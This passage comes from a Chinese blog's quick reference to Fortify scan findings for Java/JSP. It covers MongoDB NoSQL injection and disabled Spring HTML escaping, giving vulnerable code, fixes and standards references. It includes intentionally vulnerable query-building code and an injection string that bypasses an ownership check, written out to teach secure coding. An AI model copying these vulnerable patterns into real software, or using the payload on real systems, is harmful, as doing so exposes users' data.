<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[45] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[46] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection </p>
<p>[47] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19) </p>
<h4 id="NoSQL-Injection-MongoDB"><a href="#NoSQL-Injection-MongoDB" class="headerlink" title="NoSQL Injection: MongoDB"></a>NoSQL Injection: MongoDB</h4><h5 id="ABSTRACT-357"><a href="#ABSTRACT-357" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通过不可信来源的输入构建动态 MongoDB 查询，攻击者就能够修改语句的含义。</p>
<h5 id="EXPLANATION-357"><a href="#EXPLANATION-357" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>发生以下情况时，MongoDB 中会出现 NoSQL Injection 错误：</p>
<ol>
<li><p>数据从一个不可信赖的数据源进入程序。</p>
</li>
<li><p>数据用于动态地构造 MongoDB 查询。</p>
</li>
</ol>
<p>示例 1： 以下代码动态地构造并执行 MongoDB 查询，以便搜索具有特定 ID 的电子邮件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">    String emailId = request.getParameter(&quot;emailId&quot;)</span><br><span class="line"></span><br><span class="line">    MongoCollection&lt;Document&gt; col = mongoClient.getDatabase(&quot;MyDB&quot;).getCollection(&quot;emails&quot;);</span><br><span class="line"></span><br><span class="line">    BasicDBObject Query = new BasicDBObject();</span><br><span class="line"></span><br><span class="line">    Query.put(&quot;$where&quot;, &quot;this.owner == \&quot;&quot; + userName + &quot;\&quot; &amp;&amp; this.emailId == \&quot;&quot; + emailId + &quot;\&quot;&quot;);</span><br><span class="line"></span><br><span class="line">    FindIterable&lt;Document&gt; find= col.find(Query);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>查询计划执行以下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.owner == &quot;&lt;userName&gt;&quot; &amp;&amp; this.emailId == &quot;&lt;emailId&gt;&quot;</span><br></pre></td></tr></table></figure>
<p>但是，由于这个查询是动态构造的，由一个常数基本查询字符串和一个用户输入字符串连接而成，因此只有在 emailId 不包含双引号字符时，该查询才能正常运行。 如果一个用户名为 wiley 的攻击者为 emailId输入字符串 123” || “4” != “5，则该查询会变成：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this.owner == &quot;wiley&quot; &amp;&amp; this.emailId == &quot;123&quot; || &quot;4&quot; != &quot;5&quot;</span><br></pre></td></tr></table></figure>
<p>如果添加条件 <code>|| &quot;4&quot; != &quot;5&quot;</code>，where 子句的值将始终为 true，这样无论电子邮件的所有者是谁，该查询都会返回 emails 集合中存储的所有条目。RECOMMENDATIONS</p>
<p>避免基于注入的攻击的传统方法之一是，将它们作为输入验证问题来处理，并仅接受安全值白名单中的字符。列入白名单是一种非常有效的方法，它可以强制执行严格的输入验证规则。但是，在某些情况下，可能无法轻松构造安全的白名单或验证模式。例如，虽然验证数字字段或仅包含英文字母的用户名非常简单，但是验证允许使用元字符的博客帖子就比较困难。</p>
<p>另一种解决方案是对不可信数据中的特殊字符进行转义。就Example 1 而言，应用程序可以在连接字符串之前将所有双引号转义为反斜杠双引号。但是，除了引号字符之外，还需要考虑其他元字符导致的负面影响。例如，在某些实现中，空字节或换行符“\n”可能会破坏查询的最初预期逻辑。</p>
<p>避免 MongoDB 中的 NoSQL Injection 的最佳解决方法是，使用参数绑定而非动态字符串连接来生成查询字符串。</p>
<p>例 2：可以按以下方式将示例 1 重写为使用参数绑定来构造该查询：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">    String userName = ctx.getAuthenticatedUserName();</span><br><span class="line"></span><br><span class="line">    String emailId = request.getParameter(&quot;emailId&quot;)</span><br><span class="line"></span><br><span class="line">    MongoCollection&lt;Document&gt; col = mongoClient.getDatabase(&quot;MyDB&quot;).getCollection(&quot;emails&quot;);</span><br><span class="line"></span><br><span class="line">    BasicDBObject Query = new BasicDBObject();</span><br><span class="line"></span><br><span class="line">    Query.put(&quot;owner, new BasicDBObject(&quot;$eq&quot;, userName));</span><br><span class="line"></span><br><span class="line">    Query.put(&quot;emailId&quot;, new BasicDBObject(&quot;$eq&quot;, emailId));</span><br><span class="line"></span><br><span class="line">    FindIterable&lt;Document&gt; find= col.find(Query);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-355"><a href="#REFERENCES-355" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Testing for NoSQL injection OWASP</p>
<p>[2] INPUT-1: Validate inputs Oracle</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 89, CWE ID 943 </p>
<p>[4] Standards Mapping - Common Weakness Enumeration Top 25 2019 [6] CWE ID 089 </p>
<p>[5] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[6] Standards Mapping - FIPS200 SI </p>
<p>[7] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[8] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[9] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[10] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[11] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.3.4 Output Encoding and Injection Prevention Requirements, 5.3.5 Output Encoding and Injection Prevention Requirements </p>
<p>[12] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[14] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[15] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[16] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[17] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[23] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[24] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[25] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[26] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 089 </p>
<p>[27] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 089 </p>
<p>[28] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 089 </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3540.1 CAT I, APP3540.3 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[45] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002540 CAT I, APSC-DV-002560 CAT I </p>
<p>[46] Standards Mapping - Web Application Security Consortium 24 + 2 SQL Injection </p>
<p>[47] Standards Mapping - Web Application Security Consortium Version 2.00 SQL Injection (WASC-19) </p>
<h4 id="Spring-Misconfiguration-HTML-Escaping-Disabled"><a href="#Spring-Misconfiguration-HTML-Escaping-Disabled" class="headerlink" title="Spring Misconfiguration: HTML Escaping Disabled"></a>Spring Misconfiguration: HTML Escaping Disabled</h4><h5 id="ABSTRACT-358"><a href="#ABSTRACT-358" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该应用程序配置为禁用 Spring 标记的自动 HTML 转义，这可能会导致 Cross-Site Scripting 漏洞。</p>
<h5 id="EXPLANATION-358"><a href="#EXPLANATION-358" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果禁用 Spring 标记中 HTML 上下文的自动转义，则可能会导致应用程序容易遭受 Cross-Site Scripting 攻击。 </p>
<p>示例 1： 以下 web.xml 配置指示应用程序禁用 Spring 标记的自动 HTML 转义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; version=&quot;3.0&quot;</span><br><span class="line"></span><br><span class="line">	xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot; metadata-complete=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	&lt;context-param&gt;</span><br><span class="line"></span><br><span class="line">		&lt;param-name&gt;defaultHtmlEscape&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">		&lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-355"><a href="#RECOMMENDATIONS-355" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>强烈建议不要禁用标记内容的自动 HTML 转义，因为它可能包含用户控制器数据。默认情况下，会启用 HTML 转义。不要通过将 defaultHtmlEscape 设置为 false 或采用其他更好的方法来禁用 HTML 转义，请明确地将它设置为 true。</p>
<p>示例 2： 以下 web.xml 配置指示应用程序启用 Spring 标记的自动 HTML 转义。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; version=&quot;3.0&quot;</span><br><span class="line"></span><br><span class="line">	xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot; metadata-complete=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	&lt;context-param&gt;</span><br><span class="line"></span><br><span class="line">		&lt;param-name&gt;defaultHtmlEscape&lt;/param-name&gt;</span><br><span class="line"></span><br><span class="line">		&lt;param-value&gt;true&lt;/param-value&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/context-param&gt;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-356"><a href="#REFERENCES-356" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 554 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 CM </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>

      



      

  <div class="declare">
  <br><br>
  <strong>本文链接：</strong>
  http://dayun.shystartree.online/2020/12/25/fortify扫描结果速查(Java:JSP)/
  <br>
  <strong>版权声明：</strong>本博客所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a><a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="/img/licensee.png"/></a>许可协议。欢迎转载，但转载请注明来自qingyu’s blog，并保持转载后文章内容的完整，本人保留所有版权相关权利。
  
  
  </div>





      
        <div class="page-reward">
          <a href="javascript:;" class="page-reward-btn tooltip-top">
            <div class="tooltip tooltip-east">
            <span class="tooltip-item">
              赏
            </span>
            <span class="tooltip-content">
              <span class="tooltip-text">
                <span class="tooltip-inner">
                  <p class="reward-p"><i class="icon icon-quo-left"></i>觉得写得好可以请我吃杯奶茶支持下哦～～～<i class="icon icon-quo-right"></i></p>
                  <div class="reward-box">
                    
                    <div class="reward-box-item">
                      <img class="reward-img" src="/img/alipay.jpg">
                      <span class="reward-type">支付宝</span>
                    </div>
                    
                    
                    <div class="reward-box-item">
                      <img class="reward-img" src="/img/wxpay.jpg">
                      <span class="reward-type">微信</span>
                    </div>
                    
                  </div>
                </span>
              </span>
            </span>
          </div>
          </a>
        </div>
      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
        		</li>
      		 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">fortify速查</a>
        		</li>
      		
		</ul>
	</div>

      

      

      
        
<div class="share-btn share-icons tooltip-left">
  <div class="tooltip tooltip-east">
    <span class="tooltip-item">
      <a href="javascript:;" class="share-sns share-outer">
        <i class="icon icon-share"></i>
      </a>
    </span>
    <span class="tooltip-content">
      <div class="share-wrap">
        <div class="share-icons">
          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
            <i class="icon icon-weibo"></i>
          </a>
          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
            <i class="icon icon-weixin"></i>
          </a>
          <a class="qq share-sns" href="javascript:;" data-type="qq">
            <i class="icon icon-qq"></i>
          </a>
          <a class="douban share-sns" href="javascript:;" data-type="douban">
            <i class="icon icon-douban"></i>
          </a>
          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
            <i class="icon icon-qzone"></i>
          </a>
          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
            <i class="icon icon-facebook"></i>
          </a>
          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
            <i class="icon icon-twitter"></i>
          </a>
          <a class="google share-sns" href="javascript:;" data-type="google">
            <i class="icon icon-google"></i>
          </a>
        </div>
      </div>
    </span>
  </div>
</div>

<div class="page-modal wx-share js-wx-box">
    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <div class="wx-qrcode">
      <img src="//pan.baidu.com/share/qrcode?url=http://dayun.shystartree.online/2020/12/25/fortify扫描结果速查(Java:JSP)/" alt="微信分享二维码">
    </div>
</div>

<div class="mask js-mask"></div>
      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

  
<nav id="article-nav">
  
  
    <a href="/2020/10/22/fastjson反序列化漏洞史/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-title">fastjson反序列化漏洞史</div>
      <i class="icon-circle-right"></i>
    </a>
  
</nav>


<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
        <div class="toc-container tooltip-left">
            <i class="icon-font icon-category"></i>
            <div class="tooltip tooltip-east">
                <span class="tooltip-item">
                </span>
                <span class="tooltip-content">
                    <div class="toc-article">
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-JSP"><span class="toc-number">1.</span> <span class="toc-text">Java/JSP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#API误用"><span class="toc-number">1.1.</span> <span class="toc-text">API误用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ADF-Faces-Bad-Practices-unsecure-Attribute"><span class="toc-number">1.1.1.</span> <span class="toc-text">ADF Faces Bad Practices: unsecure Attribute</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS"><span class="toc-number">1.1.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES"><span class="toc-number">1.1.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Bad-Practices-Use-of-File-Scheme-Cookies"><span class="toc-number">1.1.2.</span> <span class="toc-text">Android Bad Practices: Use of File Scheme Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-1"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-1"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-1"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-1"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Castor-Bad-Practices-Query-Mode-Not-Read-Only"><span class="toc-number">1.1.3.</span> <span class="toc-text">Castor Bad Practices: Query Mode Not Read-Only</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-2"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-2"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-2"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-2"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Castor-Bad-Practices-Unspecified-Query-Mode"><span class="toc-number">1.1.4.</span> <span class="toc-text">Castor Bad Practices: Unspecified Query Mode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-3"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-3"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-3"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-3"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Call-to-System-gc"><span class="toc-number">1.1.5.</span> <span class="toc-text">Code Correctness: Call to System.gc()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-4"><span class="toc-number">1.1.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-4"><span class="toc-number">1.1.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-4"><span class="toc-number">1.1.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-4"><span class="toc-number">1.1.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Class-Does-Not-Implement-equals"><span class="toc-number">1.1.6.</span> <span class="toc-text">Code Correctness: Class Does Not Implement equals</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-5"><span class="toc-number">1.1.6.1.</span> <span 